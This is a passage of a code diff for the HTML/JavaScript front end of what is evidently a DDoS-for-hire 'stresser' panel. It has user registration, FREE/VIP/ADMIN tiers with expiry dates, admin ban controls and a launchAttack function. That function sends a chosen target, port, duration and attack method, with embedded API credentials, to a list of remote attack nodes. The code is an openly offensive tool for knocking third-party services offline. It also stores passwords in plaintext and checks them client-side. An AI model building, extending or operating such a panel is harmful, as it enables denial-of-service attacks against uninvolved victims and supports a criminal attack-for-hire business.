+    status:document.getElementById('statusDisplay'),
+    methodContainer:document.getElementById('methodContainer'),
+    logArea:document.getElementById('consoleLog'),
+    timerSec:document.getElementById('timerSection'),
+    timerDisp:document.getElementById('timerDisplay'),
+    progBar:document.getElementById('progressBar'),
+    userTable:document.getElementById('userTableBody')
+};
+
+window.onload=()=>initDB();
+
+function checkSession(){
+    const saved=sessionStorage.getItem('pn_user');
+    if(saved&&usersDB[saved]){
+        const u=usersDB[saved];
+        if(u.expiry&&Date.now()>u.expiry){
+            log("Account expired.","error");
+            return false;
         }
-
-        log(`Welcome back, ${username}. Tier: ${userData.tier}`, "info");
-        filterMethodsByTier(userData.tier);
+        loginSuccess(saved);
+        return true;
     }
+    return false;
+}
 
-    function logout() {
-        currentUser = null;
-        sessionStorage.removeItem('pn_user');
-        location.reload();
+function toggleRegister(){
+    const f=document.getElementById('registerForm');
+    f.style.display=f.style.display==='none'?'block':'none';
+}
+
+function handleLogin(){
+    const u=document.getElementById('loginUser').value.trim();
+    const p=document.getElementById('loginPass').value;
+    if(!u||!p)return log("Fill all fields.","error");
+    if(!usersDB[u])return log("User not found.","error");
+    const d=usersDB[u];
+    if(d.pass!==p)return log("Invalid credentials.","error");
+    if(d.banned)return log("Account is banned.","error");
+    if(d.expiry&&Date.now()>d.expiry)return log("Account has expired.","error");
+    loginSuccess(u);
+}
+
+function handleRegister(){
+    const u=document.getElementById('regUser').value.trim();
+    const p=document.getElementById('regPass').value;
+    const d=parseInt(document.getElementById('regDays').value);
+    if(!u||!p)return log("Fill all fields.","error");
+    if(usersDB[u])return log("User exists.","error");
+    let expiry=null;
+    if(d!==-1){
+        const now=new Date();
+        now.setDate(now.getDate()+d);
+        expiry=now.getTime();
     }
+    usersDB[u]={pass:p,tier:'FREE',banned:false,expiry:expiry};
+    saveDB();
+    log("Account created! Please login.","success");
+    toggleRegister();
+}
 
-    function renderMethods() {
-        els.methodContainer.innerHTML = '';
-        methods.forEach(m => {
-            const card = document.createElement('div');
-            card.className = 'method-card';
-            card.dataset.id = m.id;
-            card.dataset.tier = m.tier;
-            
-            const tagClass = m.tier === 'VIP' ? 'tier-vip' : 'tier-default';
-            
-            card.innerHTML = `
+function loginSuccess(username){
+    currentUser=username;
+    sessionStorage.setItem('pn_user',username);
+    const d=usersDB[username];
+    let badge='badge-free';
+    if(d.tier==='VIP')badge='badge-vip';
+    if(d.tier==='ADMIN')badge='badge-admin';
+    let exp="Infinite";
+    if(d.expiry){
+        const date=new Date(d.expiry);
+        exp=date.toLocaleDateString();
+        if(Date.now()>d.expiry){badge='badge-expired';exp+=" (EXPIRED)"}
+    }
+    els.status.innerHTML=`Logged in as: <span class="${badge}">${username}</span> <small>[${exp}]</small>`;
+    els.authPanel.style.display='none';
+    els.dashPanel.style.display='block';
+    if(d.tier==='ADMIN'){
+        els.adminPanel.style.display='block';
+        renderUserTable();
+    }else{
+        els.adminPanel.style.display='none';
+    }
+    log(`Welcome back, ${username}. Tier: ${d.tier}`,"info");
+    filterMethodsByTier(d.tier);
+}
+
+function logout(){
+    currentUser=null;
+    sessionStorage.removeItem('pn_user');
+    location.reload();
+}
+
+function renderMethods(){
+    els.methodContainer.innerHTML='';
+    methods.forEach(m=>{
+        const c=document.createElement('div');
+        c.className='method-card';
+        c.dataset.id=m.id;
+        c.dataset.tier=m.tier;
+        const tag=m.tier==='VIP'?'tier-vip':'tier-default';
+        c.innerHTML=`
+            <div>
                 <div class="method-name">${m.name}</div>
                 <div class="method-desc">${m.desc}</div>
-                <span class="tier-tag ${tagClass}">${m.tier}</span>
-            `;
-            
-            card.onclick = () => selectMethod(m.id, card);
-            els.methodContainer.appendChild(card);
-        });
+            </div>
+            <span class="tier-tag ${tag}">${m.tier}</span>`;
+        c.onclick=()=>selectMethod(m.id,c);
+        els.methodContainer.appendChild(c);
+    });
+}
+
+function filterMethodsByTier(tier){
+    const cards=document.querySelectorAll('.method-card');
+    let firstAllowed=null;
+    cards.forEach(c=>{
+        const mt=c.dataset.tier;
+        let ok=false;
+        if(tier==='ADMIN')ok=true;
+        else if(tier==='VIP')ok=(mt==='DEFAULT'||mt==='VIP');
+        else ok=(mt==='DEFAULT');
+        if(ok){
+            c.style.display='flex';
+            c.classList.remove('disabled');
+            if(!firstAllowed)firstAllowed=c;
+        }else{
+            c.style.display='none';
+            c.classList.add('disabled');
+        }
+    });
+    const sel=document.querySelector('.method-card.selected');
+    if(!sel||sel.style.display==='none'){
+        if(firstAllowed)selectMethod(firstAllowed.dataset.id,firstAllowed);
     }
+}
 
-    function filterMethodsByTier(userTier) {
-        const cards = document.querySelectorAll('.method-card');
-        cards.forEach(card => {
-            const methodTier = card.dataset.tier;
-            let allowed = false;
+function selectMethod(id,el){
+    document.querySelectorAll('.method-card').forEach(c=>c.classList.remove('selected'));
+    el.classList.add('selected');
+    selectedMethodId=id;
+    log(`Selected method: ${id}`,"normal");
+}
 
-            if (userTier === 'ADMIN') allowed = true;
-            else if (userTier === 'VIP') allowed = (methodTier === 'DEFAULT' || methodTier === 'VIP');
-            else if (userTier === 'FREE') allowed = (methodTier === 'DEFAULT');
+let attackInterval=null,startTime=null,totalDuration=0;
 
-            if (allowed) {
-                card.style.display = 'flex';
-                card.classList.remove('disabled');
-            } else {
-                card.style.display = 'none';
-                card.classList.add('disabled');
-            }
-        });
-        
-        const selCard = document.querySelector('.method-card.selected');
-        if (selCard && selCard.style.display === 'none') {
-            const firstAvail = document.querySelector('.method-card:not([style*="display: none"])');
-            if(firstAvail) selectMethod(firstAvail.dataset.id, firstAvail);
+async function launchAttack(){
+    if(!currentUser)return log("Not logged in.","error");
+    const target=document.getElementById('target').value;
+    const port=document.getElementById('port').value;
+    const duration=parseInt(document.getElementById('duration').value);
+    if(!target||!port)return log("Target/Port required.","error");
+    if(duration>60)return log("Max 60s duration.","error");
+    const btn=document.getElementById('attackBtn');
+    btn.disabled=true;btn.innerText="Attacking...";
+    log(`Initiating ${selectedMethodId} on ${target}:${port} (${duration}s)...`,"info");
+    startTimer(duration);
+    const q=`?username=${API_USER}&secret=${API_SECRET}&target=${target}&port=${port}&duration=${duration}&method=${selectedMethodId}`;
+    let ok=false;
+    for(const node of API_NODES){
+        try{
+            await fetch(node+q,{mode:'no-cors'});
+            log(`Connection via node: ${node.split('//')[1].split(':')[0]}`,"success");
+            ok=true;break;
+        }catch(e){
+            log(`Node ${node.split('//')[1].split(':')[0]} failed, trying next...`,"error");
         }
     }
-
-    function selectMethod(id, element) {
-        document.querySelectorAll('.method-card').forEach(c => c.classList.remove('selected'));
-        element.classList.add('selected');
-        selectedMethodId = id;
-        log(`Selected method: ${id}`, "normal");
+    if(!ok){
+        log("All nodes unreachable.","error");
+        stopTimer();
+        btn.disabled=false;btn.innerText="Initiate Attack";
     }
+}
 
-    let attackInterval = null;
-    let startTime = null;
-    let totalDuration = 0;
-
-    async function launchAttack() {
-        if (!currentUser) return log("Not logged in.", "error");
-        
-        const target = document.getElementById('target').value;
-        const port = document.getElementById('port').value;
-        const duration = parseInt(document.getElementById('duration').value);
-
-        if (!target || !port) return log("Target/Port required.", "error");
-        if (duration > 60) return log("Max 60s duration.", "error");
-
-        const btn = document.getElementById('attackBtn');
-        btn.disabled = true;
-        btn.innerText = "ATTACKING...";
-        
-        log(`Initiating ${selectedMethodId} on ${target}:${port} (${duration}s)...`, "info");
-
-        startTimer(duration);
-
-        const baseParams = `?username=${API_USER}&secret=${API_SECRET}&target=${target}&port=${port}&duration=${duration}&method=${selectedMethodId}`;
-        
-        let success = false;
-
-        for (const node of API_NODES) {
-            const url = node + baseParams;
-            try {
-                await fetch(url, { mode: 'no-cors' });
-                log(`Connection established via node: ${node.split('//')[1].split(':')[0]}`, "success");
-                success = true;
-                break;
-            } catch (e) {
-                log(`Node ${node.split('//')[1].split(':')[0]} failed, trying next...`, "error");
-            }
-        }
-
-        if (!success) {
-            log("All nodes unreachable.", "error");
+function startTimer(sec){
+    startTime=Date.now();
+    totalDuration=sec*1000;
+    els.timerSec.style.display='block';
+    attackInterval=setInterval(()=>{
+        const elapsed=Date.now()-startTime;
+        const remain=Math.max(0,totalDuration-elapsed);
+        const s=Math.ceil(remain/1000);
+        const mm=Math.floor(s/60).toString().padStart(2,'0');
+        const ss=(s%60).toString().padStart(2,'0');
+        els.timerDisp.innerText=`${mm}:${ss}`;
+        els.progBar.style.width=`${Math.min(100,(elapsed/totalDuration)*100)}%`;
+        if(remain<=0){
             stopTimer();
-            btn.disabled = false;
-            btn.innerText = "INITIATE ATTACK";
+            log("Attack finished.","info");
+            const b=document.getElementById('attackBtn');
+            b.disabled=false;b.innerText="Initiate Attack";
         }
+    },100);
+}
+
+function stopTimer(){
+    clearInterval(attackInterval);
+    els.timerSec.style.display='none';
+    els.progBar.style.width='0%';
+}
+
+function adminCreateUser(){
+    if(!currentUser||usersDB[currentUser].tier!=='ADMIN')return;
+    const u=document.getElementById('admNewUser').value.trim();
+    const t=document.getElementById('admNewTier').value;
+    const p=document.getElementById('admNewPass').value;
+    const d=parseInt(document.getElementById('admNewDays').value);
+    if(!u||!p)return log("Admin: Fill details.","error");
+    if(usersDB[u])return log("Admin: User exists.","error");
+    let expiry=null;
+    if(d!==-1){
+        const now=new Date();
+        now.setDate(now.getDate()+d);
+        expiry=now.getTime();
     }
+    usersDB[u]={pass:p,tier:t,banned:false,expiry:expiry};
+    saveDB();renderUserTable();
+    log(`Admin: Created ${u} (${t})`,"success");
+    document.getElementById('admNewUser').value='';
+    document.getElementById('admNewPass').value='';
+    document.getElementById('admNewDays').value='-1';
+}
 
-    function startTimer(sec) {
-        startTime = Date.now();
-        totalDuration = sec * 1000;
-        els.timerSec.style.display = 'block';
-        
-        attackInterval = setInterval(() => {
-            const elapsed = Date.now() - startTime;
-            const remaining = Math.max(0, totalDuration - elapsed);
-            
-            const sLeft = Math.ceil(remaining / 1000);
-            const mins = Math.floor(sLeft / 60).toString().padStart(2, '0');
-            const secs = (sLeft % 60).toString().padStart(2, '0');
-            
-            els.timerDisp.innerText = `${mins}:${secs}`;
-            
-            const pct = Math.min(100, (elapsed / totalDuration) * 100);
-            els.progBar.style.width = `${pct}%`;
-
-            if (remaining <= 0) {
-                stopTimer();
-                log("Attack finished.", "info");
-                document.getElementById('attackBtn').disabled = false;
-                document.getElementById('attackBtn').innerText = "INITIATE ATTACK";
-            }
-        }, 100);
-    }
-
-    function stopTimer() {
-        clearInterval(attackInterval);
-        els.timerSec.style.display = 'none';
-        els.progBar.style.width = '0%';
-    }
-
-    function adminCreateUser() {
-        if (!currentUser || usersDB[currentUser].tier !== 'ADMIN') return;
-
-        const u = document.getElementById('admNewUser').value.trim();
-        const t = document.getElementById('admNewTier').value;
-        const p = document.getElementById('admNewPass').value;
-        const d = parseInt(document.getElementById('admNewDays').value);
-
-        if (!u || !p) return log("Admin: Fill details.", "error");
-        if (usersDB[u]) return log("Admin: User exists.", "error");
-
-        let expiry = null;
-        if (d !== -1) {
-            const now = new Date();
-            now.setDate(now.getDate() + d);
-            expiry = now.getTime();
+function renderUserTable(){
+    els.userTable.innerHTML='';
+    Object.keys(usersDB).forEach(u=>{
+        const d=usersDB[u];
+        const tr=document.createElement('tr');
+        let exp="Infinite";
+        if(d.expiry){
+            const date=new Date(d.expiry);
+            exp=date.toLocaleDateString();
+            if(Date.now()>d.expiry)exp+=" <span style='color:red'>(EXP)</span>";
         }
-
-        usersDB[u] = { pass: p, tier: t, banned: false, expiry: expiry };
-        saveDB();
-        renderUserTable();
-        log(`Admin: Created user ${u} (${t})`, "success");
-        
-        document.getElementById('admNewUser').value = '';
-        document.getElementById('admNewPass').value = '';
-        document.getElementById('admNewDays').value = '-1';
-    }
-
-    function renderUserTable() {
-        els.userTable.innerHTML = '';
-        Object.keys(usersDB).forEach(username => {
-            const data = usersDB[username];
-            const tr = document.createElement('tr');
-            
-            let expiryDisplay = "Infinite";
-            if (data.expiry) {
-                const date = new Date(data.expiry);
-                expiryDisplay = date.toLocaleDateString();
-                if (Date.now() > data.expiry) expiryDisplay += " <span style='color:red'>(EXP)</span>";
-            }
-
-            let actionHtml = '';
-            if (username !== currentUser) {
-                if (data.banned) {
-                    actionHtml += `<button class="secondary" onclick="adminToggleBan('${username}')">Unban</button>`;
-                } else {
-                    actionHtml += `<button class="danger" onclick="adminToggleBan('${username}')">Ban</button>`;
-                }
-            } else {
-                actionHtml = `<span style="color:#666">Self</span>`;
-            }
-
-            tr.innerHTML = `
-                <td>${username}</td>
-                <td><span class="badge-${data.tier.toLowerCase()}">${data.tier}</span></td>
-                <td>${expiryDisplay}</td>
-                <td>${data.banned ? '<span style="color:red">BANNED</span>' : '<span style="color:green">ACTIVE</span>'}</td>
-                <td class="user-actions">${actionHtml}</td>
-            `;
-            els.userTable.appendChild(tr);
-        });
-    }
-
-    function adminToggleBan(username) {
-        if (usersDB[username]) {
-            usersDB[username].banned = !usersDB[username].banned;
-            saveDB();
-            renderUserTable();
-            log(`Admin: ${usersDB[username].banned ? 'Banned' : 'Unbanned'} ${username}`, "info");
+        let actions='';
+        if(u!==currentUser){
+            actions=d.banned
+                ?`<button class="secondary" onclick="adminToggleBan('${u}')">Unban</button>`
+                :`<button class="danger" onclick="adminToggleBan('${u}')">Ban</button>`;
+        }else{
+            actions='<span style="color:#555">Self</span>';
         }
-    }
+        tr.innerHTML=`
+            <td>${u}</td>
+            <td><span class="badge-${d.tier.toLowerCase()}">${d.tier}</span></td>
+            <td>${exp}</td>
+            <td>${d.banned?'<span style="color:red">BANNED</span>':'<span style="color:green">ACTIVE</span>'}</td>
+            <td class="user-actions">${actions}</td>`;
+        els.userTable.appendChild(tr);
+    });
+}
 
-    function log(msg, type = 'normal') {
-        const entry = document.createElement('div');
-        entry.className = `log-entry log-${type}`;
-        const time = new Date().toLocaleTimeString();
-        entry.innerText = `[${time}] ${msg}`;
-        els.logArea.appendChild(entry);
-        els.logArea.scrollTop = els.logArea.scrollHeight;
+function adminToggleBan(u){
+    if(usersDB[u]){
+        usersDB[u].banned=!usersDB[u].banned;
+        saveDB();renderUserTable();
+        log(`Admin: ${usersDB[u].banned?'Banned':'Unbanned'} ${u}`,"info");
     }
+}
+
+function log(msg,type='normal'){
+    const e=document.createElement('div');
+    e.className=`log-entry log-${type}`;
+    const t=new Date().toLocaleTimeString();
+    e.innerText=`[${t}] ${msg}`;
+    els.logArea.appendChild(e);
+    els.logArea.scrollTop=els.logArea.scrollHeight;
+}
 </script>
-
 </body>
 </html>
